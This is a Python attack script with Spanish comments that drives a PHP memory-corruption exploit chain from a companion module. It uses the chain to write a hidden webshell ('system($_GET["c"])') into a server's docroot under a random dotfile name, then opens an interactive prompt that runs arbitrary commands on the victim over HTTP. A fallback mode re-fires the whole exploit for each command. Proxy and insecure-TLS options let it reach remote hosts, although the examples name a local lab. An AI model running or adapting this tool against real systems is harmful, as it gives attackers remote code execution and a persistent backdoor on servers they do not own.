#!/usr/bin/env python3
"""pwn_shell.py — shell interactiva persistente sobre php2shell (cadena A).

Modo plant (default):
  1. Si ya hay webshell viva en --shell-path → directo al REPL.
  2. Si no: dispara la cadena completa (A1 OOM -> B1 leak -> A2 -> B2
     system()) con cmd = plantar '<?php system($_GET["c"]); ?>' en el docroot.
  3. REPL: cada comando = un request HTTP normal, output in-band, instantaneo.

Modo refire (--refire): sin webshell (docroot read-only). Cada comando =
cadena completa; output via side-channel de archivo (dir --out-dir mapeado
como /out en el contenedor lab, o ajustar cmd con --wrap).

Ejemplos:
  export P2S_PURE=../../9bie/pure
  python3 pwn_shell.py --url http://127.0.0.1:18110/
  python3 pwn_shell.py --url http://127.0.0.1:18110/ --refire --out-dir ../../9bie/runtmp
  python3 pwn_shell.py --url https://host/ --proxy 127.0.0.1:40000 -k
"""
import argparse
import importlib.util
import os
import secrets
import sys
import tempfile
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
PWN_PATH = os.path.join(HERE, "php2shell_pwn.py")

spec = importlib.util.spec_from_file_location("pwn", PWN_PATH)
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)  # SystemExit instructivo si falta P2S_PURE

WEBSHELL_PHP = "<?php system($_GET[\"c\"]); ?>"


def build_conn(args, url):
    scheme, host, port, _path = url
    custom = {}
    for h in args.header or []:
        k, _, v = h.partition(":")
        custom[k.strip()] = v.strip()
    return m.Conn(scheme, host, port, min(args.timeout, 60), args.insecure,
                  args.cookie, custom, proxy=args.proxy or None)


def shell_url(args, url):
    _s, _h, _p, path = url
    base = path.rstrip("/")
    return base + "/" + args.shell_path.lstrip("/")


def check_webshell(conn, surl):
    """GET ?c=id; viva si devuelve uid= en el body."""
    try:
        st, _hd, body = conn.request(surl + "?c=id", b"")
    except Exception:
        conn.close()
        return False
    return st == 200 and b"uid=" in body


def plant(conn, url, args):
    """Fire cadena A con cmd = plantar webshell. Retorna (ok, info_str)."""
    surl = shell_url(args, url)
    doc = args.docroot.rstrip("/")
    target = doc + "/" + args.shell_path.lstrip("/")
    cmd = "printf %s '" + WEBSHELL_PHP + "' >" + target
    tmp = tempfile.mkdtemp(prefix="pwnsh_")
    for attempt in range(1, args.retries + 1):
        print("[*] plant intento %d/%d ..." % (attempt, args.retries))
        conn = build_conn(args, url)
        info, stage = m.chain_once(url, conn, tmp, cmd,
                                    args.zdtor_off, args.zif_off)
        conn.close()
        print("    -> %s (%s)" % (stage, info))
        if stage == "FIRED":
            conn = build_conn(args, url)
            if check_webshell(conn, surl):
                print("[+] webshell viva: %s" % surl)
                return True, info
            print("    -> fired pero webshell no responde (docroot no escribible?)")
    return False, None


def run_cmd_webshell(conn, surl, cmd):
    try:
        st, _hd, body = conn.request(surl + "?c=" + urllib.parse.quote(cmd), b"")
    except Exception:
        conn.close()
        try:
            st, _hd, body = conn.request(surl + "?c=" + urllib.parse.quote(cmd), b"")
        except Exception:
            return False, b"<conn lost>"
    return st == 200, body


def run_cmd_refire(conn, url, args, cmd, tmp):
    """Cadena completa por comando; output a /out/.pwn_shell_out y leo host-side."""
    out_dir = args.out_dir or os.environ.get("P2S_OUT", "/out")
    host_out = os.path.join(out_dir, ".pwn_shell_out")
    wrapped = args.wrap % {"cmd": cmd} if args.wrap else (
        "( " + cmd + " ) > /out/.pwn_shell_out 2>&1")
    conn = build_conn(args, url)
    info, stage = m.chain_once(url, conn, tmp, wrapped,
                               args.zdtor_off, args.zif_off)
    conn.close()
    if stage != "FIRED":
        return False, ("<fire fallo: %s>" % stage).encode()
    if os.path.isfile(host_out):
        try:
            with open(host_out, "rb") as fh:
                data = fh.read()
            os.unlink(host_out)
            return True, data
        except OSError:
            pass
    return True, b"<fired; output file no accesible en " + host_out.encode() + b">"


def main():
    ap = argparse.ArgumentParser(description="shell interactiva sobre php2shell")
    ap.add_argument("--url", required=True)
    ap.add_argument("--docroot", default="/var/www/html")
    ap.add_argument("--shell-path", default=".p2s_" + secrets.token_hex(4) + ".php")
    ap.add_argument("--refire", action="store_true",
                    help="sin webshell: cadena completa por comando")
    ap.add_argument("--out-dir", default="",
                    help="refire: dir host mapeado como /out en la victima")
    ap.add_argument("--wrap", default="",
                    help="refire: plantilla cmd, %%(cmd)s (default: cmd > /out/.pwn_shell_out 2>&1)")
    ap.add_argument("--retries", type=int, default=4)
    ap.add_argument("--timeout", type=float, default=120.0)
    ap.add_argument("--zdtor-off", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--zif-off", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--header", action="append", dest="header")
    ap.add_argument("--proxy", default="")
    ap.add_argument("-k", "--insecure", action="store_true")
    args = ap.parse_args()

    url = m.normalize_url(args.url)
    surl = shell_url(args, url)
    print("[*] target: %s" % args.url)
    print("[*] webshell: %s" % surl)

    conn = build_conn(args, url)
    if not args.refire:
        if check_webshell(conn, surl):
            print("[+] webshell ya viva — sin re-fire")
        else:
            ok, info = plant(conn, url, args)
            if not ok:
                print("[!] no se pudo plantar; proba --refire")
                return 1
        conn = build_conn(args, url)
        alive = True
        while True:
            try:
                line = input("pwn> ")
            except EOFError:
                print()
                break
            except KeyboardInterrupt:
                print()
                break
            if line.strip() in ("exit", "quit"):
                break
            if not line.strip():
                continue
            alive, body = run_cmd_webshell(conn, surl, line)
            sys.stdout.write(body.decode("utf-8", "replace").rstrip() + "\n")
            if not alive:
                print("[!] webshell no responde — replant con --shell-path nuevo")
                break
    else:
        tmp = tempfile.mkdtemp(prefix="pwnsh_")
        print("[*] modo refire: cadena completa por comando (~2-3s cada uno)")
        while True:
            try:
                line = input("refire> ")
            except EOFError:
                print()
                break
            except KeyboardInterrupt:
                print()
                break
            if line.strip() in ("exit", "quit"):
                break
            if not line.strip():
                continue
            ok, body = run_cmd_refire(conn, url, args, line, tmp)
            sys.stdout.write(("[+] " if ok else "[!] ") +
                             body.decode("utf-8", "replace").rstrip() + "\n")
    conn.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
